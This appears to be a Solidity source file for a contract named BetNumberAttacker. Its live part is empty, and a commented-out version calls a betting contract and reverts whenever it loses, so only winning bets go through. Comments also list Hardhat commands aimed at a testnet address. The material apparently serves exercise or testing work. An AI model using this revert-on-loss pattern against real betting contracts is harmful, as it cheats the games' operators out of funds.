// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

interface BetNumberInterface {
    function betNumber(uint256 bet) payable external returns (bool);
}

contract BetNumberAttacker {  
}


// interface BetNumberInterface {
//     function betNumber(uint256 bet) payable external returns (bool);
// }

// contract BetNumberAttacker {  
// }


// interface BetNumberInterface {
//     function betNumber(uint256 bet) payable external returns (bool);
// }

// contract BetNumberAttacker {
//     constructor() payable {
//     }

//     receive() external payable {
//     }

//     function cheatBetNumber(address betNumberAddress) external {
//         uint256 pool = address(this).balance;
//         // play a game
//         BetNumberInterface b = BetNumberInterface(betNumberAddress);
//         b.betNumber{value: 1}(50);
//         // require win the game
//         require(address(this).balance >= pool, "lose the game");
//     }

//     function withdraw() external {
//         payable(msg.sender).transfer(address(this).balance);
//     }
// }

// Command: 
// yarn hardhat console --network thunder-testnet
// const Attacker = await ethers.getContractFactory("BetNumberAttacker");
// await attack.cheatBetNumber("0x76D1d38079A972BaD789719Af420da6e8DB57dE6", {gasLimit: 4100000})
// ttdebug testnet 0xd78f1b5684d96517416aa933c5432f27ef2c9321367be1cdc720551a65faeff2
